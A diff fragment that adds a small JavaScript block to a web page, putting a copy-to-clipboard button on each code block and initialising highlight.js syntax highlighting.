+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    var codeBlocks = document.querySelectorAll('pre code');
+    codeBlocks.forEach(function(codeBlock) {
+      var copyButton = document.createElement('button');
+      copyButton.innerHTML = '<i class="material-icons">content_copy</i>';
+      copyButton.classList.add('copy-button');
+      codeBlock.parentNode.insertBefore(copyButton, codeBlock);
+
+      copyButton.addEventListener('click', function() {
+        var code = codeBlock.textContent;
+        var textarea = document.createElement('textarea');
+        textarea.textContent = code;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        textarea.remove();
+        copyButton.innerHTML = '<i class="material-icons">check</i>';
+        setTimeout(function() {
+          copyButton.innerHTML = '<i class="material-icons">content_copy</i>';
+        }, 2000);
+      });
+    });
+
+    // Initialize highlight.js for syntax highlighting
+    hljs.initHighlightingOnLoad();
+  });
+</script>
